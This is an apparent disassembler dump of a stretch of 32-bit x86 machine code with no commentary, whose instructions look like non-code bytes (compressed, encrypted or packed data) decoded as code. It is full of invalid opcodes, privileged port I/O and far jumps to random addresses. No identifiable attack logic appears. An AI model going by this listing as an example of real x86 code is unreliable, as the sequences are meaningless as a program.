  41c86d:	shl    BYTE PTR [ebx-0x1c],0xb8
  41c871:	inc    ebx
  41c872:	dec    ebx
  41c873:	adc    ebp,DWORD PTR [edx-0xf88805d]
  41c879:	repnz mov ds,WORD PTR [ebp-0x59]
  41c87d:	and    al,0xec
  41c87f:	loop   0x41c8a0
  41c881:	loop   0x41c88a
  41c883:	adc    ebp,DWORD PTR [ecx-0x197623db]
  41c889:	inc    ebx
  41c88a:	call   0xb3c0:0x7a548c53
  41c891:	scas   al,BYTE PTR es:[edi]
  41c892:	mov    ebx,0xb9ffbb3e
  41c898:	jbe    0x41c894
  41c89a:	inc    ecx
  41c89b:	lock pop ecx
  41c89d:	mov    edi,0xe1842929
  41c8a2:	and    eax,DWORD PTR [eax]
  41c8a4:	mov    edx,0x2d38f858
  41c8a9:	test   eax,0x636b68b0
  41c8ae:	pusha  
  41c8af:	ins    DWORD PTR es:[edi],dx
  41c8b0:	out    0x84,eax
  41c8b2:	data16 (bad) 
  41c8b4:	fstp   DWORD PTR [esi+0x1]
  41c8b7:	test   al,0x7f
  41c8b9:	xor    BYTE PTR [edi+0x3ed9fe2a],0x8d
  41c8c0:	xlat   BYTE PTR ds:[ebx]
  41c8c1:	dec    esi
  41c8c2:	ds aam 0xff
  41c8c5:	jne    0x41c89e
  41c8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8c8:	mov    edx,DWORD PTR [edx]
  41c8ca:	daa    
  41c8cb:	mov    ebp,DWORD PTR [edx]
  41c8cd:	mov    ecx,DWORD PTR [esi-0x7f5e4d6]
  41c8d3:	adc    DWORD PTR [ebx],edi
  41c8d5:	mov    al,ds:0xb1d2981
  41c8da:	cli    
  41c8db:	retf   
  41c8dc:	(bad)  
  41c8dd:	ins    BYTE PTR es:[edi],dx
  41c8de:	or     al,0xf
  41c8e0:	pop    ss
  41c8e1:	cmp    eax,0x9e3c631a
  41c8e6:	mov    DWORD PTR [eax],edi
  41c8e8:	in     al,dx
  41c8e9:	jnp    0x41c89f
  41c8eb:	cwde   
  41c8ec:	call   0x7144:0x33cc60ab
  41c8f3:	pop    ss
  41c8f4:	int3   
  41c8f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8f6:	nop
  41c8f7:	icebp  
  41c8f8:	mov    cl,0xc3
  41c8fa:	stos   DWORD PTR es:[edi],eax
  41c8fb:	xor    BYTE PTR [edx+0x4495d26e],bl
  41c901:	pop    ebx
  41c902:	call   0x53fe:0xb7183e23
  41c909:	sbb    bh,BYTE PTR [edi+0x460a5d1a]
  41c90f:	jo     0x41c981
  41c911:	mov    ebp,0xc5ce5e4
  41c916:	pushf  
  41c917:	ja     0x41c994
  41c919:	adc    DWORD PTR [edi-0x32],ecx
  41c91c:	stc    
  41c91d:	xchg   edi,eax
  41c91e:	out    0x29,eax
  41c920:	mov    ds:0xed32d7a7,al
  41c925:	fwait
  41c926:	test   DWORD PTR [edx-0x572c0c7],ebp
  41c92c:	xchg   BYTE PTR [edx-0x45],dl
  41c92f:	push   ds
  41c930:	test   al,0xf2
  41c932:	and    BYTE PTR [ebp+0x7d58d4fe],0xa7
  41c939:	out    dx,eax
  41c93a:	or     BYTE PTR [edi],cl
  41c93c:	dec    edx
  41c93d:	sbb    BYTE PTR [edi-0x508f3d89],dl
  41c943:	aaa    
  41c944:	stos   BYTE PTR es:[edi],al
  41c945:	retf   0x4029
  41c948:	mov    BYTE PTR [edi+0x5e],ch
  41c94b:	sub    eax,0x8044d32a
  41c950:	inc    ebx
  41c951:	ret    
  41c952:	pop    esi
  41c953:	sbb    eax,0x74599be3
  41c958:	mov    ds:0xd43a820e,al
  41c95d:	push   ss
  41c95e:	sar    BYTE PTR [eax-0xa1d3b2e],0x39
  41c965:	jecxz  0x41c8f4
  41c967:	stos   DWORD PTR es:[edi],eax
  41c968:	adc    eax,0xd9109e92
  41c96d:	mov    BYTE PTR [edx],dh
  41c96f:	sbb    BYTE PTR [ebx*2+0x4b7f6ff4],ah
  41c976:	mov    DWORD PTR [ebp-0x78],ebp
  41c979:	xor    al,0x89
  41c97b:	mov    cl,0x49
  41c97d:	sbb    eax,0xb332b25e
  41c982:	ja     0x41c9c3
  41c984:	aad    0xda
  41c986:	adc    BYTE PTR [edx+0x75fdda36],0xfb
  41c98d:	jge    0x41c965
  41c98f:	mov    ds:0x9ba0a9e4,al
  41c994:	or     BYTE PTR [eax+edx*2+0x28],0x9
  41c999:	repnz push eax
  41c99b:	push   ss
  41c99c:	mov    ebx,0x834d4d5d
  41c9a1:	sbb    DWORD PTR [ebp-0x2b4ae5ee],ebx
  41c9a7:	pop    ebp
  41c9a8:	lahf   
  41c9a9:	scas   eax,DWORD PTR es:[edi]
  41c9aa:	aad    0xb
  41c9ac:	in     eax,dx
  41c9ad:	sti    
  41c9ae:	xchg   BYTE PTR ds:0x928468f3,ch
  41c9b4:	mov    dl,0xae
  41c9b6:	jecxz  0x41c9f3
  41c9b8:	cld    
  41c9b9:	test   al,0xef
  41c9bb:	mov    dh,0xf1
  41c9bd:	in     eax,dx
  41c9be:	jg     0x41c9ee
  41c9c0:	lds    ebp,FWORD PTR [esi-0x54cfc6c0]
  41c9c6:	lahf   
  41c9c7:	pop    ss
  41c9c8:	aas    
  41c9c9:	leave  
  41c9ca:	xchg   DWORD PTR [esi-0x4c75cc64],eax
  41c9d0:	stos   BYTE PTR es:[edi],al
  41c9d1:	inc    eax
  41c9d2:	ja     0x41c9fc
  41c9d4:	lahf   
  41c9d5:	jg     0x41c962
  41c9d7:	sub    DWORD PTR [ebp-0x72],0xb83d32f3
  41c9de:	add    ch,BYTE PTR [esi-0x41]
  41c9e1:	xor    DWORD PTR [esi-0x58],edx
  41c9e4:	xlat   BYTE PTR ds:[ebx]
  41c9e5:	aaa    
  41c9e6:	xchg   edx,eax
  41c9e7:	loope  0x41c96d
  41c9e9:	and    al,0xd1
  41c9eb:	shr    DWORD PTR [esi+0x4bf0812f],cl
  41c9f1:	pop    ss
  41c9f2:	pushf  
  41c9f3:	test   al,0x5c
  41c9f5:	add    BYTE PTR [ebp+eiz*1+0x58124a0a],dl
  41c9fc:	adc    DWORD PTR [edx+0x4d5127af],0x8a74e711
  41ca06:	in     eax,dx
  41ca07:	pop    ebp
  41ca08:	imul   edx,esi,0xffffffab
  41ca0b:	pop    fs
  41ca0d:	xchg   edi,eax
  41ca0e:	sub    DWORD PTR [ebx-0x760ff0fa],edx
  41ca14:	(bad)  
  41ca15:	pop    ebx
  41ca16:	js     0x41ca26
  41ca18:	ins    BYTE PTR es:[edi],dx
  41ca19:	call   0xbcafd057
  41ca1e:	fistp  WORD PTR [ecx-0x1d]
  41ca21:	imul   ebx,DWORD PTR [edi],0x1f
  41ca24:	arpl   WORD PTR [edi],ax
  41ca26:	in     eax,dx
  41ca27:	add    esi,0xc205bd65
  41ca2d:	cmp    bh,0x10
  41ca30:	jl     0x41ca68
  41ca32:	jno    0x41c9df
  41ca34:	rol    BYTE PTR [ebx+0x33],1
  41ca37:	inc    ecx
  41ca38:	aaa    
  41ca39:	outs   dx,DWORD PTR ds:[esi]
  41ca3a:	es dec edx
  41ca3c:	mov    BYTE PTR [ecx-0x76],cl
  41ca3f:	icebp  
  41ca40:	jg     0x41c9f1
  41ca42:	xchg   esi,eax
  41ca43:	addr16 ja 0x41ca54
  41ca46:	sub    BYTE PTR [esi-0x3c],cl
  41ca49:	ret    
  41ca4a:	adc    eax,0x269b0989
  41ca4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca50:	pop    DWORD PTR [edi+edx*1-0x55]
  41ca54:	and    ah,BYTE PTR [edx+ebx*4+0x1a969536]
  41ca5b:	int3   
  41ca5c:	add    edx,ebp
  41ca5e:	sub    eax,0xc51b0a16
  41ca63:	push   cs
  41ca64:	clc    
  41ca65:	push   esi
  41ca66:	(bad)  
  41ca68:	stos   BYTE PTR es:[edi],al
  41ca69:	mov    esi,DWORD PTR [esi+0x2c]
  41ca6c:	pop    es
  41ca6d:	sub    DWORD PTR [ebp-0x40],0xe1281fab
  41ca74:	jb     0x41ca62
  41ca76:	(bad)  
  41ca78:	mov    bh,0xd6
  41ca7a:	mov    esi,0x78467099
  41ca7f:	add    eax,0x446f8fea
  41ca84:	out    dx,eax
  41ca85:	push   ecx
  41ca86:	lods   al,BYTE PTR ds:[esi]
  41ca87:	mov    bl,0xe2
  41ca89:	jmp    0x41caa8
  41ca8b:	rcr    DWORD PTR [edx+0x17],0xac
  41ca8f:	xor    DWORD PTR [eax+esi*1],ebx
  41ca92:	and    DWORD PTR [esi+0x22],esp
  41ca95:	imul   edx,DWORD PTR [ebx-0x7d9bea9],0x7c
  41ca9c:	(bad)  
  41ca9d:	clc    
  41ca9e:	dec    ebx
  41ca9f:	popf   
  41caa0:	jae    0x41cab3
  41caa2:	fsubr  QWORD PTR [edx]
  41caa4:	mov    ds:0x4f9649bb,eax
  41caa9:	push   edi
  41caaa:	or     esp,eax
  41caac:	jp     0x41cafe
  41caae:	fcom   QWORD PTR ds:0x336f3c5b
  41cab4:	adc    ebp,esi
  41cab6:	cmp    DWORD PTR [ebp+0x43eed027],ebp
  41cabc:	add    BYTE PTR ss:[ebx],cl
  41cabf:	fisub  WORD PTR [edx]
  41cac1:	push   eax
  41cac2:	out    0x54,al
  41cac4:	pop    ds
  41cac5:	ds mov ch,0x82
  41cac8:	jmp    0x6c139b5d
  41cacd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cace:	mov    edi,0x67269b39
  41cad3:	dec    edi
  41cad4:	xlat   BYTE PTR ds:[ebx]
  41cad5:	(bad)  [ebx+eiz*4+0x54aa85ac]
  41cadc:	push   eax
  41cadd:	and    DWORD PTR [edx],edx
  41cadf:	xor    ebx,DWORD PTR [ecx+0xe01ac13]
  41cae5:	ret    
  41cae6:	scas   al,BYTE PTR es:[edi]
  41cae7:	jmp    0x41caf7
  41cae9:	call   0x58f:0x16532b8b
  41caf0:	dec    ecx
  41caf1:	pop    esp
  41caf2:	loope  0x41cb18
  41caf4:	cmp    ebp,DWORD PTR [esi+0x2b393198]
  41cafa:	test   al,0x27
  41cafc:	sub    eax,0x254cc01c
  41cb01:	scas   eax,DWORD PTR es:[edi]
  41cb02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb04:	jp     0x41cb23
  41cb06:	mov    eax,ds:0x3eea24c9
  41cb0b:	lods   al,BYTE PTR ds:[esi]
  41cb0c:	(bad)  
  41cb0d:	push   esp
  41cb0e:	mov    bl,0xf1
  41cb10:	icebp  
  41cb11:	hlt    
  41cb12:	mov    ss,WORD PTR [esi+ebp*2+0x6ac8408c]
  41cb19:	aaa    
  41cb1a:	xchg   ebx,eax
  41cb1b:	xor    al,0x27
  41cb1d:	pop    ebx
  41cb1e:	sub    esp,DWORD PTR [esi]
  41cb20:	(bad)  
  41cb21:	fistp  QWORD PTR [esi+ebx*8+0x26]
  41cb25:	rol    DWORD PTR [ebp+0x5621179],cl
  41cb2b:	mov    esp,0x2a53ff7e
  41cb30:	jmp    0x11552a8b
  41cb35:	fnstenv [edi+ecx*1]
  41cb38:	fsubrp st(1),st
  41cb3a:	rcr    DWORD PTR [ebx],0x13
  41cb3d:	adc    BYTE PTR [esi],bl
  41cb3f:	jmp    0x5f18e682
  41cb44:	jmp    0x41cb71
  41cb46:	lahf   
  41cb47:	sbb    BYTE PTR [edi+0x64e452cb],dh
  41cb4d:	icebp  
  41cb4e:	mov    ah,0xa6
  41cb50:	dec    esp
  41cb51:	sbb    ch,0x95
  41cb54:	mov    ebx,0xe49d073c
  41cb59:	into   
  41cb5a:	ret    0x751d
  41cb5d:	cld    
  41cb5e:	cmp    al,0x62
  41cb60:	dec    BYTE PTR [edi]
  41cb62:	xchg   ebx,eax
  41cb63:	cmp    al,0xb2
  41cb65:	xor    bh,BYTE PTR [esi]
  41cb67:	rol    BYTE PTR [esi-0x379d7b57],1
  41cb6d:	call   0xd9dc2b5a
  41cb72:	pop    esp
  41cb73:	add    BYTE PTR [ebx],ah
  41cb75:	(bad)  
  41cb76:	jbe    0x41cbd7
  41cb78:	aam    0x1a
  41cb7a:	sbb    al,0x28
  41cb7c:	js     0x41cbc8
  41cb7e:	mul    ebp
  41cb80:	lds    eax,FWORD PTR [esi+0x24]
  41cb83:	retf   0x570b
  41cb86:	adc    cl,BYTE PTR [ecx+0x64]
  41cb89:	and    BYTE PTR [ebx],0x1c
  41cb8c:	and    dl,BYTE PTR [eax-0x63e717b4]
  41cb92:	retf   0xcafe
  41cb95:	inc    esi
  41cb96:	(bad)  
  41cb98:	jne    0x41cc12
  41cb9a:	mov    bh,0xdd
  41cb9c:	pop    DWORD PTR [ebp-0x3e20362]
  41cba2:	lods   eax,DWORD PTR ds:[esi]
  41cba3:	jne    0x41cb30
  41cba5:	lods   al,BYTE PTR ds:[esi]
  41cba6:	ja     0x41cb7c
  41cba8:	pop    es
  41cba9:	mov    ah,0x84
  41cbab:	xor    ah,BYTE PTR [edi+0x27e4a1f4]
  41cbb1:	ret    0x4a5f
  41cbb4:	mov    ebx,0xd464c08e
  41cbb9:	sbb    DWORD PTR [edi+0x1692d39c],ebp
  41cbbf:	mov    ?,WORD PTR [esi]
  41cbc1:	pop    esi
  41cbc2:	into   
  41cbc3:	(bad)  
  41cbc4:	adc    eax,0x8da98efd
  41cbc9:	push   ds
  41cbca:	fmul   DWORD PTR [edi-0x43c1bc9]
  41cbd0:	mov    edi,0xd4019766
  41cbd5:	or     al,0xfd
  41cbd7:	jo     0x41cc0b
  41cbd9:	(bad)
  41cbdd:	mov    esi,0x6012ce6c
  41cbe2:	out    0xf5,al
  41cbe4:	arpl   WORD PTR [esi+0x440460e7],si
  41cbea:	jp     0x41cc29
  41cbec:	repnz mov al,ds:0xe22195a8
  41cbf2:	ret    0xc4b3
  41cbf5:	mov    edi,0x9373fa45
  41cbfa:	mov    ds,WORD PTR [edx]
  41cbfc:	data16 test al,0xa4
  41cbff:	ds sub ch,dl
  41cc02:	fisub  WORD PTR [edi]
  41cc04:	sub    esp,DWORD PTR [eax+0x78be8d7b]
  41cc0a:	xchg   edi,edi
  41cc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc0d:	jnp    0x41cc48
  41cc0f:	test   al,0x3f
  41cc11:	adc    bl,BYTE PTR [edx]
  41cc13:	jbe    0x41cbb8
  41cc15:	loope  0x41cbc8
  41cc17:	and    BYTE PTR [edx-0x292d376c],0x2f
  41cc1e:	add    DWORD PTR [edi],0x6614d4d1
  41cc24:	inc    ecx
  41cc25:	inc    eax
  41cc26:	dec    ebx
  41cc27:	adc    ebp,DWORD PTR [ecx]
  41cc29:	fdivr  DWORD PTR [eax+0x743afb4a]
  41cc2f:	stos   DWORD PTR es:[edi],eax
  41cc30:	mov    ecx,0x2d57944e
  41cc35:	dec    edx
  41cc36:	and    bl,al
  41cc38:	mov    ds:0x3dbb13ed,eax
  41cc3d:	fs xchg edx,eax
  41cc3f:	push   0x2f537559
  41cc44:	xor    esi,DWORD PTR [ebp-0x69011a89]
  41cc4a:	test   al,0xac
  41cc4c:	clc    
  41cc4d:	xchg   BYTE PTR ds:0xd8e2e29f,dl
  41cc53:	or     cl,BYTE PTR [ecx-0x4]
  41cc56:	je     0x41cc01
  41cc58:	pop    ecx
  41cc59:	fstp   QWORD PTR [edx-0x2c]
  41cc5c:	cdq    
  41cc5d:	fsub   st,st(6)
  41cc5f:	sub    al,0x4d
  41cc61:	aas    
  41cc62:	dec    edx
  41cc63:	add    ebx,esi
  41cc65:	mov    dh,BYTE PTR [eax]
  41cc67:	jns    0x41ccce
  41cc69:	loop   0x41cc85
  41cc6b:	ret    0xa50d
  41cc6e:	fs jno 0x41cc3b
  41cc71:	cmp    bh,al
  41cc73:	ins    DWORD PTR es:[edi],dx
  41cc74:	aaa    
  41cc75:	fadd   QWORD PTR [ecx]
  41cc77:	leave  
  41cc78:	inc    esp
  41cc79:	mov    ecx,0x6512117f
  41cc7e:	ins    BYTE PTR es:[edi],dx
  41cc7f:	out    dx,eax
  41cc80:	loope  0x41cc4c
  41cc82:	retf   0x8b8f
  41cc85:	(bad)  
  41cc86:	push   ds
  41cc87:	sub    ecx,ebp
  41cc89:	rcr    BYTE PTR ds:[esi],1
  41cc8c:	test   al,0x57
  41cc8e:	xchg   esp,eax
  41cc8f:	test   DWORD PTR [eax+0x1b],ecx
  41cc92:	stos   BYTE PTR es:[edi],al
  41cc93:	xor    dl,bl
  41cc95:	sub    eax,0x2cdc1c73
  41cc9a:	(bad)  
  41cc9c:	jno    0x41cc5d
  41cc9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc9f:	data16 mov ss,WORD PTR ds:0x44516084
  41cca6:	pop    ecx
  41cca7:	test   al,0xd3
  41cca9:	lods   eax,DWORD PTR ds:[esi]
  41ccaa:	hlt    
  41ccab:	mov    ebp,ecx
  41ccad:	ja     0x41cd2e
  41ccaf:	jb     0x41ccb8
  41ccb1:	pop    edx
  41ccb2:	ret    0x4ef3
  41ccb5:	push   esp
  41ccb6:	adc    eax,0x53a99ed2
  41ccbb:	aad    0x9e
  41ccbd:	int3   
  41ccbe:	sbb    DWORD PTR [ecx+edx*2],edx
  41ccc1:	cmp    edi,esi
  41ccc3:	outs   dx,BYTE PTR ds:[esi]
  41ccc4:	lods   eax,DWORD PTR ds:[esi]
  41ccc5:	mov    cl,0x54
  41ccc7:	push   es
  41ccc8:	test   bl,ch
  41ccca:	fwait
  41cccb:	stos   BYTE PTR es:[edi],al
  41cccc:	in     al,dx
  41cccd:	in     al,dx
  41ccce:	scas   eax,DWORD PTR es:[edi]
  41cccf:	ret    0xd2c7
  41ccd2:	shl    BYTE PTR [eax],0x47
  41ccd5:	mov    dl,0xab
  41ccd7:	jp     0x41cd04
  41ccd9:	sub    eax,0x5ed945ee
  41ccde:	mov    ebp,0x33a878f4
  41cce3:	jg     0x41cd07
  41cce5:	mov    dh,0x96
  41cce7:	jp     0x41cd3a
  41cce9:	mov    esp,0x8fa8af93
  41ccee:	push   esp
  41ccef:	push   cs
  41ccf0:	push   ecx
  41ccf1:	ret    0xd36
  41ccf4:	div    BYTE PTR [ecx-0x367ae971]
  41ccfa:	mov    ebx,0x265b9e7a
  41ccff:	daa    
  41cd00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd01:	test   al,0x58
  41cd03:	frstor [ecx+edx*1-0x3e]
  41cd07:	out    dx,al
  41cd08:	sub    al,BYTE PTR [eax]
  41cd0a:	icebp  
  41cd0b:	mov    ds:0xac911abc,eax
  41cd10:	mov    bl,BYTE PTR [esi-0x18ce6565]
  41cd16:	or     dl,BYTE PTR [esi+edi*2-0x7]
  41cd1a:	nop
  41cd1b:	out    0xc0,al
  41cd1d:	add    eax,0x160b6cdf
  41cd22:	cld    
  41cd23:	push   esi
  41cd24:	mov    ds:0xc82e233,al
  41cd29:	ror    BYTE PTR [ebp-0x77fc02c6],1
  41cd2f:	outs   dx,DWORD PTR ds:[esi]
  41cd30:	mov    eax,0xd07b2bd2
  41cd35:	sub    eax,0x82f75863
  41cd3a:	ret    0xb7af
  41cd3d:	(bad)  
  41cd3f:	ret    0xfd79
  41cd42:	sar    BYTE PTR [eax-0x4c4ce591],cl
  41cd48:	lahf   
  41cd49:	dec    eax
  41cd4a:	jmp    0xe4fa:0x5959d1f3
  41cd51:	retfw  0x167b
  41cd55:	push   ebp
  41cd56:	out    dx,al
  41cd57:	lds    edi,FWORD PTR [esi+0xbed0804]
  41cd5d:	or     edi,esp
  41cd5f:	fsub   QWORD PTR [ebx]
  41cd61:	adc    eax,0xa19a62a9
  41cd66:	sbb    DWORD PTR [esi+ebx*4],esp
  41cd69:	(bad)  
  41cd6a:	mov    eax,0x4850712c
  41cd6f:	xchg   esp,eax
  41cd70:	adc    al,0x83
  41cd72:	in     al,0x32
  41cd74:	xor    dh,BYTE PTR [eax-0x13]
  41cd77:	daa    
  41cd78:	push   esi
  41cd79:	pop    esi
  41cd7a:	push   ecx
  41cd7b:	lods   al,BYTE PTR ds:[esi]
  41cd7c:	mov    edi,0x61d34f22
  41cd81:	dec    eax
  41cd82:	loop   0x41cd09
  41cd84:	dec    ecx
  41cd85:	ret    0x37ca
  41cd88:	aad    0xf3
  41cd8a:	(bad)  [edx+0x5ecb182c]
  41cd90:	jmp    0x41cd90
  41cd92:	or     ebp,DWORD PTR [edx-0x7fb6ad26]
  41cd98:	fwait
  41cd99:	inc    esi
  41cd9a:	outs   dx,DWORD PTR ds:[esi]
  41cd9b:	(bad)  
  41cd9c:	movaps xmm3,XMMWORD PTR [ebx-0x68dc2d3e]
  41cda3:	jne    0x41cdb3
  41cda5:	pop    esp
  41cda6:	inc    ebp
  41cda7:	ja     0x41cdb5
  41cda9:	aam    0x37
  41cdab:	arpl   si,bx
  41cdad:	scas   al,BYTE PTR es:[edi]
  41cdae:	xchg   BYTE PTR ds:0x5fb957db,bh
  41cdb4:	sub    BYTE PTR fs:[edx-0x182f7ca2],ah
  41cdbb:	adc    bh,BYTE PTR [esi]
  41cdbd:	(bad)  
  41cdbe:	push   ds
  41cdbf:	fstp   DWORD PTR [eax+0x2464515d]
  41cdc5:	mov    ebp,0xf620190c
  41cdca:	jno    0x41ce23
  41cdcc:	test   eax,0xc2c61d12
  41cdd1:	test   DWORD PTR [edx+0x2b],eax
  41cdd4:	test   ah,0xf3
  41cdd7:	sbb    al,0xef
  41cdd9:	xor    BYTE PTR [ecx-0xf16c8ad],0x6b
  41cde0:	cdq    
  41cde1:	xchg   esp,eax
  41cde2:	add    eax,0xef8e5e8d
  41cde7:	pushf  
  41cde8:	add    eax,0xdec81203
  41cded:	outs   dx,BYTE PTR ds:[esi]
  41cdee:	loope  0x41cdf8
  41cdf0:	je     0x41ce45
  41cdf2:	es xchg ecx,eax
  41cdf4:	in     eax,dx
  41cdf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf6:	xchg   edx,eax
  41cdf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdf8:	aas    
  41cdf9:	jbe    0x41cd9d
  41cdfb:	sub    edi,edx
  41cdfd:	xlat   BYTE PTR ds:[ebx]
  41cdfe:	cld    
  41cdff:	call   0xd89be071
  41ce04:	outs   dx,BYTE PTR ds:[esi]
  41ce05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce06:	add    bh,cl
  41ce08:	or     DWORD PTR [ebx],0xfffffffc
  41ce0b:	jne    0x41ce67
  41ce0d:	not    DWORD PTR ds:0x8a9f0892
  41ce13:	fiadd  DWORD PTR [ecx+0x69]
  41ce16:	jns    0x41ce63
  41ce18:	(bad)  
  41ce19:	and    dl,ch
  41ce1b:	mov    bh,BYTE PTR [ebx]
  41ce1d:	sbb    al,0xa6
  41ce1f:	add    BYTE PTR [eax+0x3f],ah
  41ce22:	inc    ecx
  41ce23:	call   0xfdfeecb8
  41ce28:	sub    bh,cl
  41ce2a:	es inc edi
  41ce2c:	mov    al,ds:0x6f99a7d9
  41ce31:	xlat   BYTE PTR ds:[ebx]
  41ce32:	fadd   QWORD PTR [ecx+0x6fde53cb]
  41ce38:	lds    ecx,FWORD PTR [esi]
  41ce3a:	or     cl,BYTE PTR [edx-0x2a]
  41ce3d:	sub    ebp,esp
  41ce3f:	sub    al,0xb8
  41ce41:	jle    0x41ce85
  41ce43:	mov    ecx,DWORD PTR [edi]
  41ce45:	inc    DWORD PTR [ecx]
  41ce47:	mov    WORD PTR [edx-0x7a],ds
  41ce4a:	or     dh,cl
  41ce4c:	arpl   WORD PTR [ebx+eiz*8],bx
  41ce4f:	add    BYTE PTR [ecx-0x7a834d65],al
  41ce55:	pop    edi
  41ce56:	fidiv  DWORD PTR [edi+0x3dabbad9]
  41ce5c:	or     eax,0x8a485cd0
  41ce61:	mov    esi,0xae6223c1
  41ce66:	outs   dx,DWORD PTR ss:[esi]
  41ce68:	push   edi
  41ce69:	loope  0x41ce5a
  41ce6b:	and    esp,DWORD PTR [esi+ecx*8-0x22bf2c41]
  41ce72:	daa    
  41ce73:	sahf   
  41ce74:	xor    eax,0xc46e73bf
  41ce79:	mov    edx,0xa29a2fd4
  41ce7e:	retf   0xffbf
  41ce81:	into   
  41ce82:	test   BYTE PTR [edi],al
  41ce84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce85:	(bad)  
  41ce87:	xor    ebx,DWORD PTR [ebx+0x223171c3]
  41ce8d:	repz mov cl,0x50
  41ce90:	add    BYTE PTR [edx-0x79],0x1a
  41ce94:	ret    0x718d
  41ce97:	push   edi
  41ce98:	dec    esp
  41ce99:	dec    edx
  41ce9a:	(bad)  
  41ce9b:	jmp    0x41ce7f
  41ce9d:	jmp    0x4777af18
  41cea2:	xchg   ebx,eax
  41cea3:	mov    ds:0x3ac6989,al
  41cea8:	mov    edx,0x4d57e036
  41cead:	mov    ds:0x2658b99c,eax
  41ceb2:	add    esp,edx
  41ceb4:	and    al,BYTE PTR [eax]
  41ceb6:	sbb    al,0xc6
  41ceb8:	xchg   ebp,eax
  41ceb9:	scas   eax,DWORD PTR es:[edi]
  41ceba:	out    0x54,al
  41cebc:	push   0x8db14348
  41cec1:	fdiv   QWORD PTR [edi-0x4]
  41cec4:	xor    BYTE PTR [edi],dl
  41cec6:	jb     0x41ce7e
  41cec8:	pop    ss
  41cec9:	into   
  41ceca:	lahf   
  41cecb:	jl     0x41cf0a
  41cecd:	add    eax,0xa70200c2
  41ced2:	push   0xffffff94
  41ced4:	lods   al,BYTE PTR ds:[esi]
  41ced5:	jmp    0x41cedd
  41ced7:	stos   BYTE PTR es:[edi],al
  41ced8:	imul   BYTE PTR [esi]
  41ceda:	mov    eax,ds:0x2289596c
  41cedf:	cmp    al,BYTE PTR [eax-0x1]
  41cee2:	jne    0x41ce9b
  41cee4:	test   BYTE PTR [ebx+0x6c],al
  41cee7:	(bad)  
  41cee8:	mov    WORD PTR [edx-0x8],fs
  41ceeb:	out    dx,eax
  41ceec:	fnstcw WORD PTR [ebx+0x5e43cdf8]
  41cef2:	adc    DWORD PTR [esi+0x3f9e1014],edi
  41cef8:	addr16 xor edx,ebx
  41cefb:	dec    esp
  41cefc:	loope  0x41cf32
  41cefe:	and    cl,BYTE PTR ds:0xac41b64b
  41cf04:	add    BYTE PTR [ecx],al
  41cf06:	mov    ss,WORD PTR [ebx]
  41cf08:	mov    esp,0xb2dcaafc
  41cf0d:	mov    ah,0xa9
  41cf0f:	frstor [edx]
  41cf11:	nop
  41cf12:	dec    eax
  41cf13:	push   0x26
  41cf15:	not    BYTE PTR [ebx+0x60411bc9]
  41cf1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf1c:	out    dx,eax
  41cf1d:	inc    ebp
  41cf1e:	ins    BYTE PTR es:[edi],dx
  41cf1f:	inc    edi
  41cf20:	pop    esp
  41cf21:	gs (bad) 
  41cf23:	pop    edx
  41cf24:	ins    DWORD PTR es:[edi],dx
  41cf25:	js     0x41cebb
  41cf27:	gs test ecx,ebx
  41cf2a:	dec    eax
  41cf2b:	and    BYTE PTR [esi+0x3],cl
  41cf2e:	xchg   ebx,eax
  41cf2f:	int    0x1f
  41cf31:	or     eax,0x13d5b15
  41cf36:	jecxz  0x41ceba
  41cf38:	jno    0x41cec8
  41cf3a:	and    eax,0x420abd86
  41cf3f:	xor    DWORD PTR [eax],ecx
  41cf41:	jno    0x41cf6c
  41cf43:	xor    ah,BYTE PTR [ebp+0x342d8653]
  41cf49:	scas   al,BYTE PTR es:[edi]
  41cf4a:	lods   al,BYTE PTR ds:[esi]
  41cf4b:	cmp    bh,ch
  41cf4d:	or     DWORD PTR [edi],ecx
  41cf4f:	sbb    BYTE PTR [ebx+0x11234508],0xf3
  41cf56:	jns    0x41cf0f
  41cf58:	mov    dh,0x42
  41cf5a:	addr16 push 0xaa3e3dfd
  41cf60:	(bad)  
  41cf61:	imul   DWORD PTR [ebp+0x4a903fd5]
  41cf67:	dec    esp
  41cf68:	cmp    eax,0xa298313a
  41cf6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf6e:	and    cl,BYTE PTR [eax-0x5c]
  41cf71:	adc    eax,0x7a15e303
  41cf76:	or     BYTE PTR [ecx],ah
  41cf78:	sbb    al,0xd6
  41cf7a:	mov    ebp,0xfa1490f8
  41cf7f:	js     0x41cf22
  41cf81:	lea    ebx,[ecx+0x3441290a]
  41cf87:	cmp    eax,0xbcf504c1
  41cf8c:	fisubr WORD PTR [ecx]
  41cf8e:	jno    0x41cf1e
  41cf90:	pushf  
  41cf91:	mov    eax,0x806792af
  41cf96:	sub    esp,DWORD PTR [esi]
  41cf98:	ds jge 0x41cf81
  41cf9b:	xor    al,0x44
  41cf9d:	rol    BYTE PTR [edi+0x62],1
  41cfa0:	xchg   ebp,eax
  41cfa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfa2:	test   al,0x3e
  41cfa4:	aas    
  41cfa5:	sbb    al,0xd4
  41cfa7:	inc    ecx
  41cfa8:	neg    DWORD PTR [esi]
  41cfaa:	pop    edi
  41cfab:	xor    DWORD PTR [eax],eax
  41cfad:	ror    DWORD PTR [ebp+0x6c],1
  41cfb0:	mov    ebp,0x9810ac9b
  41cfb5:	jbe    0x41cf39
  41cfb7:	inc    edx
  41cfb8:	fnsave [ebp-0x44]
  41cfbb:	iret   
  41cfbc:	stc    
  41cfbd:	loope  0x41cfe9
  41cfbf:	push   edx
  41cfc0:	imul   ecx,DWORD PTR [esi+0x20],0x9a6b3468
